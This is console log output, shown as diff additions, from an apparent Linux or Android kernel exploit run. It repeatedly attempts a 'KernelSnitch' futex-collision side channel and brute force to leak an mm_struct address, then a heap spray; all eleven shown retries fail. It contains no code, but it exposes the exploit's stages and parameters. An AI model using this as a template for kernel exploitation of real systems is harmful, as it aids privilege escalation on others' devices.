+[33m[*] [0m  00000051ec6ec150[33m[*] [0m  00000051ec871d78[33m[*] [0m  00000051ec8e5118[33m[*] [0m  00000051ec946420[33m[*] [0m  00000051eca93e88[33m[*] [0m  00000051ecabbfc8[33m[*] [0m  00000051ecb564a0[33m[*] [0m  00000051ecbd0870[33m[*] [0m  00000051ed259cb8[33m[*] [0m  00000051ed34c450[33m[*] [0m  00000051ed4bdfd8[33m[*] [0m  00000051ed4c4010[33m[*] [0m  00000051ed4ca040[33m[*] [0m  00000051ed6bcfd0[33m[*] [0m  00000051ed7db8c8[33m[*] [0mfound 15 collisisons
+[33m[*] [0m[p1] spray: pre/post mms killed, waiting leak child[33m[*] [0mKernelSnitch collisions: found
+[33m[*] [0m[p2] collisions ok, launching bruteforce[33m[*] [0mstart bruteforcing
+[33m[*] [0m[  7] start finding mm_struct [ffffff81c0000000-ffffff8200000000]
+[33m[*] [0m[  5] start finding mm_struct [ffffff8140000000-ffffff8180000000]
+[33m[*] [0m[  3] start finding mm_struct [ffffff80c0000000-ffffff8100000000]
+[33m[*] [0m[  1] start finding mm_struct [ffffff8040000000-ffffff8080000000]
+[33m[*] [0m[  4] start finding mm_struct [ffffff8100000000-ffffff8140000000]
+[33m[*] [0m[  6] start finding mm_struct [ffffff8180000000-ffffff81c0000000]
+[33m[*] [0m[  0] start finding mm_struct [ffffff8000000000-ffffff8040000000]
+[33m[*] [0m[  2] start finding mm_struct [ffffff8080000000-ffffff80c0000000]
+[33m[*] [0m[p3] bruteforce returned cnt=0 best=0[33m[*] [0mKernelSnitch bruteforce: state=5 found=0 mm_struct=0xffffffffffffffff
+[31m[-] [0mKernelSnitch mm_struct leak failed
+[33m[*] [0mdone
+[31m[-] [0mprepare_kernel_page retry 14/24
+[33m[*] [0mKernelSnitch setup: cpus=8 mm_per_slab=34 prep=1088 spray=204 pre=33 post=34
+[33m[*] [0mparameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
+[33m[*] [0mKernelSnitch parameters: threads=8 collisions=16 futexes=262144 identity_step=0x40000000
+[33m[*] [0mstart finding collisisons
+[33m[*] [0mtarget    000000710cee00c8
+[33m[*] [0m  00000051ec729338[33m[*] [0m  00000051ec747428[33m[*] [0m  00000051ec7e18f8[33m[*] [0m  00000051ec88ee60[33m[*] [0m  00000051ec8e6120[33m[*] [0m  00000051eca52c80[33m[*] [0m  00000051ed1a06f0[33m[*] [0m  00000051ed1ae760[33m[*] [0m  00000051ed2f91b8[33m[*] [0m  00000051ed467d28[33m[*] [0m  00000051ed7b3788[33m[*] [0m  00000051ed7c07f0[33m[*] [0m  00000051ed830b70[33m[*] [0m  00000051eda29b38[33m[*] [0m  00000051edad0070[33m[*] [0mfound 15 collisisons
+[33m[*] [0m[p1] spray: pre/post mms killed, waiting leak child[33m[*] [0mKernelSnitch collisions: found
+[33m[*] [0m[p2] collisions ok, launching bruteforce[33m[*] [0mstart bruteforcing
+[33m[*] [0m[  7] start finding mm_struct [ffffff81c0000000-ffffff8200000000]
+[33m[*] [0m[  3] start finding mm_struct [ffffff80c0000000-ffffff8100000000]
+[33m[*] [0m[  5] start finding mm_struct [ffffff8140000000-ffffff8180000000]
+[33m[*] [0m[  1] start finding mm_struct [ffffff8040000000-ffffff8080000000]
+[33m[*] [0m[  0] start finding mm_struct [ffffff8000000000-ffffff8040000000]
+[33m[*] [0m[  2] start finding mm_struct [ffffff8080000000-ffffff80c0000000]
+[33m[*] [0m[  4] start finding mm_struct [ffffff8100000000-ffffff8140000000]
+[33m[*] [0m[  6] start finding mm_struct [ffffff8180000000-ffffff81c0000000]
+[33m[*] [0m[p3] bruteforce returned cnt=0 best=0[33m[*] [0mKernelSnitch bruteforce: state=5 found=0 mm_struct=0xffffffffffffffff
+[31m[-] [0mKernelSnitch mm_struct leak failed
+[33m[*] [0mdone
+[31m[-] [0mprepare_kernel_page retry 15/24
+[33m[*] [0mKernelSnitch setup: cpus=8 mm_per_slab=34 prep=1088 spray=204 pre=33 post=34
+[33m[*] [0mparameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
+[33m[*] [0mKernelSnitch parameters: threads=8 collisions=16 futexes=262144 identity_step=0x40000000
+[33m[*] [0mstart finding collisisons
+[33m[*] [0mtarget    000000710cee00c8
+[33m[*] [0m  00000051ec724310[33m[*] [0m  00000051ec77c5d0[33m[*] [0m  00000051ec7d78a8[33m[*] [0m  00000051ec83ebe0[33m[*] [0m  00000051ec851c78[33m[*] [0m  00000051ec9e2900[33m[*] [0m  00000051ecc6ed60[33m[*] [0m  00000051ecc89e38[33m[*] [0m  00000051ece07a28[33m[*] [0m  00000051ecf50470[33m[*] [0m  00000051ed0d4090[33m[*] [0m  00000051ed2e9138[33m[*] [0m  00000051ed387628[33m[*] [0m  00000051ed3d5898[33m[*] [0m  00000051ed3e3908[33m[*] [0mfound 15 collisisons
+[33m[*] [0m[p1] spray: pre/post mms killed, waiting leak child[33m[*] [0mKernelSnitch collisions: found
+[33m[*] [0m[p2] collisions ok, launching bruteforce[33m[*] [0mstart bruteforcing
+[33m[*] [0m[  7] start finding mm_struct [ffffff81c0000000-ffffff8200000000]
+[33m[*] [0m[  3] start finding mm_struct [ffffff80c0000000-ffffff8100000000]
+[33m[*] [0m[  5] start finding mm_struct [ffffff8140000000-ffffff8180000000]
+[33m[*] [0m[  0] start finding mm_struct [ffffff8000000000-ffffff8040000000]
+[33m[*] [0m[  2] start finding mm_struct [ffffff8080000000-ffffff80c0000000]
+[33m[*] [0m[  1] start finding mm_struct [ffffff8040000000-ffffff8080000000]
+[33m[*] [0m[  6] start finding mm_struct [ffffff8180000000-ffffff81c0000000]
+[33m[*] [0m[  4] start finding mm_struct [ffffff8100000000-ffffff8140000000]
+[33m[*] [0m[p3] bruteforce returned cnt=0 best=0[33m[*] [0mKernelSnitch bruteforce: state=5 found=0 mm_struct=0xffffffffffffffff
+[31m[-] [0mKernelSnitch mm_struct leak failed
+[33m[*] [0mdone
+[31m[-] [0mprepare_kernel_page retry 16/24
+[33m[*] [0mKernelSnitch setup: cpus=8 mm_per_slab=34 prep=1088 spray=204 pre=33 post=34
+[33m[*] [0mparameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
+[33m[*] [0mKernelSnitch parameters: threads=8 collisions=16 futexes=262144 identity_step=0x40000000
+[33m[*] [0mstart finding collisisons
+[33m[*] [0mtarget    000000710cee00c8
+[33m[*] [0m  00000051ec7c2800[33m[*] [0m  00000051ec8c3008[33m[*] [0m  00000051eca1fae8[33m[*] [0m  00000051eca37ba8[33m[*] [0m  00000051ecaadf58[33m[*] [0m  00000051ecabbfc8[33m[*] [0m  00000051ecb02200[33m[*] [0m  00000051ecbe6920[33m[*] [0m  00000051ece35b98[33m[*] [0m  00000051ecff89b0[33m[*] [0m  00000051ed0a4f10[33m[*] [0m  00000051ed0bdfd8[33m[*] [0m  00000051ed21fae8[33m[*] [0m  00000051ed2c5018[33m[*] [0m  00000051ed467d28[33m[*] [0mfound 15 collisisons
+[33m[*] [0m[p1] spray: pre/post mms killed, waiting leak child[33m[*] [0mKernelSnitch collisions: found
+[33m[*] [0m[p2] collisions ok, launching bruteforce[33m[*] [0mstart bruteforcing
+[33m[*] [0m[  4] start finding mm_struct [ffffff8100000000-ffffff8140000000]
+[33m[*] [0m[  5] start finding mm_struct [ffffff8140000000-ffffff8180000000]
+[33m[*] [0m[  0] start finding mm_struct [ffffff8000000000-ffffff8040000000]
+[33m[*] [0m[  2] start finding mm_struct [ffffff8080000000-ffffff80c0000000]
+[33m[*] [0m[  1] start finding mm_struct [ffffff8040000000-ffffff8080000000]
+[33m[*] [0m[  7] start finding mm_struct [ffffff81c0000000-ffffff8200000000]
+[33m[*] [0m[  3] start finding mm_struct [ffffff80c0000000-ffffff8100000000]
+[33m[*] [0m[  6] start finding mm_struct [ffffff8180000000-ffffff81c0000000]
+[33m[*] [0m[p3] bruteforce returned cnt=0 best=0[33m[*] [0mKernelSnitch bruteforce: state=5 found=0 mm_struct=0xffffffffffffffff
+[31m[-] [0mKernelSnitch mm_struct leak failed
+[33m[*] [0mdone
+[31m[-] [0mprepare_kernel_page retry 17/24
+[33m[*] [0mKernelSnitch setup: cpus=8 mm_per_slab=34 prep=1088 spray=204 pre=33 post=34
+[33m[*] [0mparameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
+[33m[*] [0mKernelSnitch parameters: threads=8 collisions=16 futexes=262144 identity_step=0x40000000
+[33m[*] [0mstart finding collisisons
+[33m[*] [0mtarget    000000710cee00c8
+[33m[*] [0m  00000051ec708230[33m[*] [0m  00000051ec74b448[33m[*] [0m  00000051ec868d30[33m[*] [0m  00000051ec8d4090[33m[*] [0m  00000051ec946420[33m[*] [0m  00000051ec96c550[33m[*] [0m  00000051ec9f2980[33m[*] [0m  00000051eca0fa68[33m[*] [0m  00000051ecbdb8c8[33m[*] [0m  00000051ecbde8e0[33m[*] [0m  00000051eccfe1e0[33m[*] [0m  00000051ecda4710[33m[*] [0m  00000051ece2cb50[33m[*] [0m  00000051ece52c80[33m[*] [0m  00000051ecf7a5c0[33m[*] [0mfound 15 collisisons
+[33m[*] [0m[p1] spray: pre/post mms killed, waiting leak child[33m[*] [0mKernelSnitch collisions: found
+[33m[*] [0m[p2] collisions ok, launching bruteforce[33m[*] [0mstart bruteforcing
+[33m[*] [0m[  4] start finding mm_struct [ffffff8100000000-ffffff8140000000]
+[33m[*] [0m[  3] start finding mm_struct [ffffff80c0000000-ffffff8100000000]
+[33m[*] [0m[  2] start finding mm_struct [ffffff8080000000-ffffff80c0000000]
+[33m[*] [0m[  5] start finding mm_struct [ffffff8140000000-ffffff8180000000]
+[33m[*] [0m[  1] start finding mm_struct [ffffff8040000000-ffffff8080000000]
+[33m[*] [0m[  6] start finding mm_struct [ffffff8180000000-ffffff81c0000000]
+[33m[*] [0m[  0] start finding mm_struct [ffffff8000000000-ffffff8040000000]
+[33m[*] [0m[  7] start finding mm_struct [ffffff81c0000000-ffffff8200000000]
+[33m[*] [0m[p3] bruteforce returned cnt=0 best=0[33m[*] [0mKernelSnitch bruteforce: state=5 found=0 mm_struct=0xffffffffffffffff
+[31m[-] [0mKernelSnitch mm_struct leak failed
+[33m[*] [0mdone
+[31m[-] [0mprepare_kernel_page retry 18/24
+[33m[*] [0mKernelSnitch setup: cpus=8 mm_per_slab=34 prep=1088 spray=204 pre=33 post=34
+[33m[*] [0mparameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
+[33m[*] [0mKernelSnitch parameters: threads=8 collisions=16 futexes=262144 identity_step=0x40000000
+[33m[*] [0mstart finding collisisons
+[33m[*] [0mtarget    000000710cee00c8
+[33m[*] [0m  00000051ec7c17f8[33m[*] [0m  00000051ec92c350[33m[*] [0m  00000051ec94b448[33m[*] [0m  00000051ecacb048[33m[*] [0m  00000051ecc72d80[33m[*] [0m  00000051ecda8730[33m[*] [0m  00000051ece06a20[33m[*] [0m  00000051ecf31378[33m[*] [0m  00000051ecf3d3d8[33m[*] [0m  00000051ed124310[33m[*] [0m  00000051ed367528[33m[*] [0m  00000051ed407a28[33m[*] [0m  00000051ed68ee60[33m[*] [0m  00000051ed696ea0[33m[*] [0m  00000051ed70a240[33m[*] [0mfound 15 collisisons
+[33m[*] [0m[p1] spray: pre/post mms killed, waiting leak child[33m[*] [0mKernelSnitch collisions: found
+[33m[*] [0m[p2] collisions ok, launching bruteforce[33m[*] [0mstart bruteforcing
+[33m[*] [0m[  3] start finding mm_struct [ffffff80c0000000-ffffff8100000000]
+[33m[*] [0m[  4] start finding mm_struct [ffffff8100000000-ffffff8140000000]
+[33m[*] [0m[  6] start finding mm_struct [ffffff8180000000-ffffff81c0000000]
+[33m[*] [0m[  2] start finding mm_struct [ffffff8080000000-ffffff80c0000000]
+[33m[*] [0m[  7] start finding mm_struct [ffffff81c0000000-ffffff8200000000]
+[33m[*] [0m[  1] start finding mm_struct [ffffff8040000000-ffffff8080000000]
+[33m[*] [0m[  5] start finding mm_struct [ffffff8140000000-ffffff8180000000]
+[33m[*] [0m[  0] start finding mm_struct [ffffff8000000000-ffffff8040000000]
+[33m[*] [0m[p3] bruteforce returned cnt=0 best=0[33m[*] [0mKernelSnitch bruteforce: state=5 found=0 mm_struct=0xffffffffffffffff
+[31m[-] [0mKernelSnitch mm_struct leak failed
+[33m[*] [0mdone
+[31m[-] [0mprepare_kernel_page retry 19/24
+[33m[*] [0mKernelSnitch setup: cpus=8 mm_per_slab=34 prep=1088 spray=204 pre=33 post=34
+[33m[*] [0mparameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
+[33m[*] [0mKernelSnitch parameters: threads=8 collisions=16 futexes=262144 identity_step=0x40000000
+[33m[*] [0mstart finding collisisons
+[33m[*] [0mtarget    000000710cee00c8
+[33m[*] [0m  00000051ec7eb948[33m[*] [0m  00000051ec813a88[33m[*] [0m  00000051ec894e90[33m[*] [0m  00000051ec9574a8[33m[*] [0m  00000051ec988630[33m[*] [0m  00000051ec9966a0[33m[*] [0m  00000051eca3ebe0[33m[*] [0m  00000051ecb48430[33m[*] [0m  00000051ecb966a0[33m[*] [0m  00000051eccaaf40[33m[*] [0m  00000051eccb9fb8[33m[*] [0m  00000051ecccf068[33m[*] [0m  00000051eccfe1e0[33m[*] [0m  00000051ecd6a540[33m[*] [0m  00000051ed6f5198[33m[*] [0mfound 15 collisisons
+[33m[*] [0m[p1] spray: pre/post mms killed, waiting leak child[33m[*] [0mKernelSnitch collisions: found
+[33m[*] [0m[p2] collisions ok, launching bruteforce[33m[*] [0mstart bruteforcing
+[33m[*] [0m[  3] start finding mm_struct [ffffff80c0000000-ffffff8100000000]
+[33m[*] [0m[  7] start finding mm_struct [ffffff81c0000000-ffffff8200000000]
+[33m[*] [0m[  1] start finding mm_struct [ffffff8040000000-ffffff8080000000]
+[33m[*] [0m[  6] start finding mm_struct [ffffff8180000000-ffffff81c0000000]
+[33m[*] [0m[  0] start finding mm_struct [ffffff8000000000-ffffff8040000000]
+[33m[*] [0m[  4] start finding mm_struct [ffffff8100000000-ffffff8140000000]
+[33m[*] [0m[  2] start finding mm_struct [ffffff8080000000-ffffff80c0000000]
+[33m[*] [0m[  5] start finding mm_struct [ffffff8140000000-ffffff8180000000]
+[33m[*] [0m[p3] bruteforce returned cnt=0 best=0[33m[*] [0mKernelSnitch bruteforce: state=5 found=0 mm_struct=0xffffffffffffffff
+[31m[-] [0mKernelSnitch mm_struct leak failed
+[33m[*] [0mdone
+[31m[-] [0mprepare_kernel_page retry 20/24
+[33m[*] [0mKernelSnitch setup: cpus=8 mm_per_slab=34 prep=1088 spray=204 pre=33 post=34
+[33m[*] [0mparameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
+[33m[*] [0mKernelSnitch parameters: threads=8 collisions=16 futexes=262144 identity_step=0x40000000
+[33m[*] [0mstart finding collisisons
+[33m[*] [0mtarget    000000710cee00c8
+[33m[*] [0m  00000051ec6f4190[33m[*] [0m  00000051ec7ad758[33m[*] [0m  00000051ec7c9838[33m[*] [0m  00000051ec8f5198[33m[*] [0m  00000051ec952480[33m[*] [0m  00000051ecafc1d0[33m[*] [0m  00000051ecb1a2c0[33m[*] [0m  00000051ecd6f568[33m[*] [0m  00000051ecd75598[33m[*] [0m  00000051ecddc8d0[33m[*] [0m  00000051ece57ca8[33m[*] [0m  00000051ecf5e4e0[33m[*] [0m  00000051ed06dd58[33m[*] [0m  00000051ed249c38[33m[*] [0m  00000051ed511278[33m[*] [0mfound 15 collisisons
+[33m[*] [0m[p1] spray: pre/post mms killed, waiting leak child[33m[*] [0mKernelSnitch collisions: found
+[33m[*] [0m[p2] collisions ok, launching bruteforce[33m[*] [0mstart bruteforcing
+[33m[*] [0m[  5] start finding mm_struct [ffffff8140000000-ffffff8180000000]
+[33m[*] [0m[  0] start finding mm_struct [ffffff8000000000-ffffff8040000000]
+[33m[*] [0m[  2] start finding mm_struct [ffffff8080000000-ffffff80c0000000]
+[33m[*] [0m[  4] start finding mm_struct [ffffff8100000000-ffffff8140000000]
+[33m[*] [0m[  6] start finding mm_struct [ffffff8180000000-ffffff81c0000000]
+[33m[*] [0m[  1] start finding mm_struct [ffffff8040000000-ffffff8080000000]
+[33m[*] [0m[  3] start finding mm_struct [ffffff80c0000000-ffffff8100000000]
+[33m[*] [0m[  7] start finding mm_struct [ffffff81c0000000-ffffff8200000000]
+[33m[*] [0m[p3] bruteforce returned cnt=0 best=0[33m[*] [0mKernelSnitch bruteforce: state=5 found=0 mm_struct=0xffffffffffffffff
+[31m[-] [0mKernelSnitch mm_struct leak failed
+[33m[*] [0mdone
+[31m[-] [0mprepare_kernel_page retry 21/24
+[33m[*] [0mKernelSnitch setup: cpus=8 mm_per_slab=34 prep=1088 spray=204 pre=33 post=34
+[33m[*] [0mparameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
+[33m[*] [0mKernelSnitch parameters: threads=8 collisions=16 futexes=262144 identity_step=0x40000000
+[33m[*] [0mstart finding collisisons
+[33m[*] [0mtarget    000000710cee00c8
+[33m[*] [0m  00000051ec70c250[33m[*] [0m  00000051ec7b4790[33m[*] [0m  00000051ec81bac8[33m[*] [0m  00000051ecab9fb8[33m[*] [0m  00000051ecb50470[33m[*] [0m  00000051ecc58cb0[33m[*] [0m  00000051ecd89638[33m[*] [0m  00000051ecdb2780[33m[*] [0m  00000051ecfd78a8[33m[*] [0m  00000051ed065d18[33m[*] [0m  00000051ed18b648[33m[*] [0m  00000051ed2bbfc8[33m[*] [0m  00000051ed2fc1d0[33m[*] [0m  00000051ed569538[33m[*] [0m  00000051ed593688[33m[*] [0mfound 15 collisisons
+[33m[*] [0m[p1] spray: pre/post mms killed, waiting leak child[33m[*] [0mKernelSnitch collisions: found
+[33m[*] [0m[p2] collisions ok, launching bruteforce[33m[*] [0mstart bruteforcing
+[33m[*] [0m[  5] start finding mm_struct [ffffff8140000000-ffffff8180000000]
+[33m[*] [0m[  2] start finding mm_struct [ffffff8080000000-ffffff80c0000000]
+[33m[*] [0m[  3] start finding mm_struct [ffffff80c0000000-ffffff8100000000]
+[33m[*] [0m[  0] start finding mm_struct [ffffff8000000000-ffffff8040000000]
+[33m[*] [0m[  6] start finding mm_struct [ffffff8180000000-ffffff81c0000000]
+[33m[*] [0m[  7] start finding mm_struct [ffffff81c0000000-ffffff8200000000]
+[33m[*] [0m[  1] start finding mm_struct [ffffff8040000000-ffffff8080000000]
+[33m[*] [0m[  4] start finding mm_struct [ffffff8100000000-ffffff8140000000]
+[33m[*] [0m[p3] bruteforce returned cnt=0 best=0[33m[*] [0mKernelSnitch bruteforce: state=5 found=0 mm_struct=0xffffffffffffffff
+[31m[-] [0mKernelSnitch mm_struct leak failed
+[33m[*] [0mdone
+[31m[-] [0mprepare_kernel_page retry 22/24
+[33m[*] [0mKernelSnitch setup: cpus=8 mm_per_slab=34 prep=1088 spray=204 pre=33 post=34
+[33m[*] [0mparameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
+[33m[*] [0mKernelSnitch parameters: threads=8 collisions=16 futexes=262144 identity_step=0x40000000
+[33m[*] [0mstart finding collisisons
+[33m[*] [0mtarget    000000710cee00c8
+[33m[*] [0m  00000051ec8a7f28[33m[*] [0m  00000051ec8c7028[33m[*] [0m  00000051eccb4f90[33m[*] [0m  00000051eccb5f98[33m[*] [0m  00000051ecea6f20[33m[*] [0m  00000051ed04ec60[33m[*] [0m  00000051ed18c650[33m[*] [0m  00000051ed1f89b0[33m[*] [0m  00000051ed2cb048[33m[*] [0m  00000051ed2fc1d0[33m[*] [0m  00000051ed424b10[33m[*] [0m  00000051ed454c90[33m[*] [0m  00000051ed464d10[33m[*] [0m  00000051ed504210[33m[*] [0m  00000051ed649c38[33m[*] [0mfound 15 collisisons
+[33m[*] [0m[p1] spray: pre/post mms killed, waiting leak child[33m[*] [0mKernelSnitch collisions: found
+[33m[*] [0m[p2] collisions ok, launching bruteforce[33m[*] [0mstart bruteforcing
+[33m[*] [0m[  3] start finding mm_struct [ffffff80c0000000-ffffff8100000000]
+[33m[*] [0m[  7] start finding mm_struct [ffffff81c0000000-ffffff8200000000]
+[33m[*] [0m[  5] start finding mm_struct [ffffff8140000000-ffffff8180000000]
+[33m[*] [0m[  1] start finding mm_struct [ffffff8040000000-ffffff8080000000]
+[33m[*] [0m[  6] start finding mm_struct [ffffff8180000000-ffffff81c0000000]
+[33m[*] [0m[  2] start finding mm_struct [ffffff8080000000-ffffff80c0000000]
+[33m[*] [0m[  4] start finding mm_struct [ffffff8100000000-ffffff8140000000]
+[33m[*] [0m[  0] start finding mm_struct [ffffff8000000000-ffffff8040000000]
+[33m[*] [0m[p3] bruteforce returned cnt=0 best=0[33m[*] [0mKernelSnitch bruteforce: state=5 found=0 mm_struct=0xffffffffffffffff
+[31m[-] [0mKernelSnitch mm_struct leak failed
+[33m[*] [0mdone
+[31m[-] [0mprepare_kernel_page retry 23/24
+[33m[*] [0mKernelSnitch setup: cpus=8 mm_per_slab=34 prep=1088 spray=204 pre=33 post=34
+[33m[*] [0mparameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
+[33m[*] [0mKernelSnitch parameters: threads=8 collisions=16 futexes=262144 identity_step=0x40000000
+[33m[*] [0mstart finding collisisons
+[33m[*] [0mtarget    000000710cee00c8
+[33m[*] [0m  00000051ec6d80b0[33m[*] [0m  00000051ec7011f8[33m[*] [0m  00000051ec8aaf40[33m[*] [0m  00000051ecc71d78[33m[*] [0m  00000051ecd31378[33m[*] [0m  00000051ecd9f6e8[33m[*] [0m  00000051ecdb97b8[33m[*] [0m  00000051ece99eb8[33m[*] [0m  00000051ed147428[33m[*] [0m  00000051ed203a08[33m[*] [0m  00000051ed4d5098[33m[*] [0m  00000051ed55f4e8[33m[*] [0m  00000051ed7de8e0[33m[*] [0m  00000051ed9202f0[33m[*] [0m  00000051eda51c78[33m[*] [0mfound 15 collisisons
+[33m[*] [0m[p1] spray: pre/post mms killed, waiting leak child[33m[*] [0mKernelSnitch collisions: found
+[33m[*] [0m[p2] collisions ok, launching bruteforce[33m[*] [0mstart bruteforcing
+[33m[*] [0m[  1] start finding mm_struct [ffffff8040000000-ffffff8080000000]
+[33m[*] [0m[  0] start finding mm_struct [ffffff8000000000-ffffff8040000000]
+[33m[*] [0m[  5] start finding mm_struct [ffffff8140000000-ffffff8180000000]
+[33m[*] [0m[  2] start finding mm_struct [ffffff8080000000-ffffff80c0000000]
+[33m[*] [0m[  6] start finding mm_struct [ffffff8180000000-ffffff81c0000000]
+[33m[*] [0m[  4] start finding mm_struct [ffffff8100000000-ffffff8140000000]
+[33m[*] [0m[  3] start finding mm_struct [ffffff80c0000000-ffffff8100000000]
+[33m[*] [0m[  7] start finding mm_struct [ffffff81c0000000-ffffff8200000000]
+[33m[*] [0m[p3] bruteforce returned cnt=0 best=0[33m[*] [0mKernelSnitch bruteforce: state=5 found=0 mm_struct=0xffffffffffffffff
+[31m[-] [0mKernelSnitch mm_struct leak failed
+[33m[*] [0mdone
+[31m[-] [0mprepare_kernel_page retry 24/24
+[31m[!] [0m  heap spray failed
